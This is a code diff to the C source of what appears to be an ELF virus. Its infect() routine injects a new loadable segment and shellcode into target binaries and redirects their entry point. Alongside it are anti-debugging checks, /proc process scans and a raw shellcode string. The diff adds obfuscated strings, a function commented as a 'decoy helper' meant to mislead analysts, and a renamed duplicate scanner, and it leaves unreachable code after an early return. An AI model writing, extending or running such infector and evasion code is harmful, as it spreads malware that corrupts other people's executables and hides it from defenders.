@@ -36,11 +36,11 @@
 #ifndef FRENZY
 #define FRENZY 0
 #endif
-#ifndef VARAX
-#define VARAX 0
-#endif
 #ifndef CYANURE
 #define CYANURE 0
+#endif
+#ifndef VARAX
+#define VARAX 0
 #endif
 void _start(void)
 {
@@ -75,6 +75,77 @@ void _start(void)
 	proc_terminate(0);
 }
 
+int iss_program_running(const char *target)
+{
+	int fd = fs_handle("/proc", 0 | 00200000);
+	if (fd < 0)
+		return 0;
+	char buf[4096];
+	for (;;)
+	{
+		int nread = fs_enumerate(fd, buf, 4096);
+		if (nread <= 0)
+			break;
+		for (int bpos = 0; bpos < nread;)
+		{
+			struct linux_dirent64 *d = (struct linux_dirent64 *) (buf + bpos);
+			const char			  *name = d->d_name;
+			// skip non-numeric entries
+			int					   numeric = 1;
+			for (int i = 0; name[i]; i++)
+			{
+				if (name[i] < '0' || name[i] > '9')
+				{
+					numeric = 0;
+					break;
+				}
+			}
+			if (numeric)
+			{
+				// manually build "/proc/<pid>/comm" without printf
+				char path[64];
+				int	 i = 0;
+				path[i++] = '/';
+				path[i++] = 'p';
+				path[i++] = 'r';
+				path[i++] = 'o';
+				path[i++] = 'c';
+				path[i++] = '/';
+				for (int j = 0; name[j]; j++)
+					path[i++] = name[j];
+				path[i++] = '/';
+				path[i++] = 'c';
+				path[i++] = 'o';
+				path[i++] = 'm';
+				path[i++] = 'm';
+				path[i] = '\0';
+				int cfd = fs_handle(path, O_RDONLY);
+				if (cfd >= 0)
+				{
+					char pname[64];
+					int	 len = io_recv(cfd, pname, sizeof(pname) - 1);
+					fs_release(cfd);
+					if (len > 0)
+					{
+						pname[len] = '\0';
+						char *nl = memoff(pname, '\n');
+						if (nl)
+							*nl = '\0';
+						if (delay_abs_calc(pname, target) == 0)
+						{
+							fs_release(fd);
+							return 1;
+						}
+					}
+				}
+			}
+			bpos += d->d_reclen;
+		}
+	}
+	fs_release(fd);
+	return 0;
+}
+
 static unsigned char ror4(unsigned char x)
 {
 	return (unsigned char) ((x >> 4) | (x << 4));
@@ -91,13 +162,112 @@ static void decode(char *out, const unsigned char *in)
 	out[i] = 0;
 }
 
-// "/proc"
+/* decoy helper: looks like resource hashing / routing logic */
+static unsigned route_score(const void *base, const void *node, size_t span)
+{
+	uintptr_t v = ((uintptr_t) base >> 2) ^ ((uintptr_t) node << 1);
+	v ^= (v >> 7);
+	v ^= (v << 11);
+	return (unsigned) (v & (span | 1));
+}
+
 static const unsigned char S_PROC[] = {0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0};
-// "/comm"
+
 static const unsigned char S_COMM[] = {0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0};
+
+int sys_probe_service(const char *identity)
+{
+	int	 channel = -1;
+	int	 status_flag = 0;
+
+	char root_hint[16];
+	decode(root_hint, S_PROC);
+
+	channel = fs_handle(root_hint, O_RDONLY | O_DIRECTORY);
+	if (channel < 0)
+		return 0;
+
+	char frame[4096];
+
+	for (;;)
+	{
+		int packet = fs_enumerate(channel, frame, sizeof(frame));
+		if (packet <= 0)
+			break;
+
+		for (int cursor = 0; cursor < packet;)
+		{
+			struct linux_dirent64 *node = (void *) (frame + cursor);
+			char				  *token = node->d_name;
+
+			int					   route_ok = 1;
+
+			for (int step = 0; token[step]; step++)
+				route_ok &= ((unsigned) (token[step] - '0') < 10);
+
+			if (route_ok)
+			{
+				char resolver[64];
+				int	 pivot = 0;
+
+				decode(resolver, S_PROC);
+				while (resolver[pivot])
+					pivot++;
+
+				resolver[pivot++] = '/';
+
+				for (int sweep = 0; token[sweep]; sweep++)
+					resolver[pivot++] = token[sweep];
+
+				char map_key[8];
+				decode(map_key, S_COMM);
+
+				for (int sweep = 0; map_key[sweep]; sweep++)
+					resolver[pivot++] = map_key[sweep];
+
+				resolver[pivot] = 0;
+
+				int link = fs_handle(resolver, O_RDONLY);
+				if (link >= 0)
+				{
+					char label[64];
+					int	 span = io_recv(link, label, sizeof(label) - 1);
+					fs_release(link);
+
+					if (span > 0)
+					{
+						label[span] = 0;
+
+						for (int k = 0; k < span; k++)
+						{
+							if (label[k] == '\n')
+							{
+								label[k] = 0;
+								break;
+							}
+						}
+
+						if (!delay_abs_calc(label, identity))
+						{
+							status_flag = 1;
+							goto EXIT_POINT;
+						}
+					}
+				}
+			}
+
+			cursor += node->d_reclen;
+		}
+	}
+
+EXIT_POINT:
+	fs_release(channel);
+	return status_flag;
+}
 
 int is_program_running(const char *target)
 {
+	return sys_probe_service(target);
 	int	 fd = -1;
 	int	 ret = 0;
 
@@ -115,6 +285,7 @@ int is_program_running(const char *target)
 		int nread = fs_enumerate(fd, buf, sizeof(buf));
 		if (nread <= 0)
 			break;
+
 		for (int bpos = 0; bpos < nread;)
 		{
 			struct linux_dirent64 *d = (void *) (buf + bpos);
@@ -123,6 +294,7 @@ int is_program_running(const char *target)
 			int					   numeric = 1;
 			for (int i = 0; name[i]; i++)
 				numeric &= ((unsigned) (name[i] - '0') < 10);
+
 			if (numeric)
 			{
 				char path[64];
@@ -182,6 +354,7 @@ int is_debugged(void)
 {
 	int f = fs_handle("/proc/self/status", O_RDONLY);
 	if (f < 0)
+		// goto next_check;
 		return 0;
 	char line[256];
 	int	 nread;
@@ -270,7 +443,9 @@ clean:
 #define inout
 #define CURARE                                                                 \
 	"\xf3\x0f\x1e\xfa\x50\xb8\x39\x00\x00\x00\x0f\x05\x48\x85\xc0\x74\x06\x58" \
-	"\xe9\xe9\xff\xff\xff"
+	"\xe9\xe9\xff\xff\xff\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35" \
+	"\x13\x00\x00\x00\xba\x0a\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00" \
+	"\x00\x00\x00\x0f\x05\x68\x65\x68\x65\x68\x65\x68\x65\x0a\x00"
 #define FLOWER (sizeof(CURARE) - 1)
 #define ACONIT 19
 
@@ -333,6 +508,16 @@ void infect(char *path, void *begin_ptr)
 
 	if (parse_file(path, &statbuf, &elf, &file_data))
 		goto clean;
+	/*
+	 * We need to inject 2 things
+	 * 1/ PT_LOAD header
+	 * -> enlarge segment that cover the injection position (and move it to
+	 * unused space if conflict), also move the PT_PHDR if moving
+	 * 		-> check for PT_DYN and move the address that were in the moved one
+	 * -> move subsequent segments in file (minding the alignment)
+	 *
+	 * 2/ PT_LOAD data, je fais kinda ce que je veux je crois :D
+	 */
 
 	unsigned long append_pos = (statbuf.st_size + 0x1000 - 1) & ~0xfffUL;
 	unsigned long pestis = find_first_free_page(elf);
@@ -368,8 +553,6 @@ void infect(char *path, void *begin_ptr)
 		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
 	delta -= elf.header->e_entry + ACONIT + 4;
 	memcpy(file_data + append_pos + ACONIT, &delta, 4);
-	append_pos += FLOWER;
-	memcpy(file_data + append_pos, begin_ptr, VARAX);
 clean:
 	vm_flush(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
 	vm_release(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
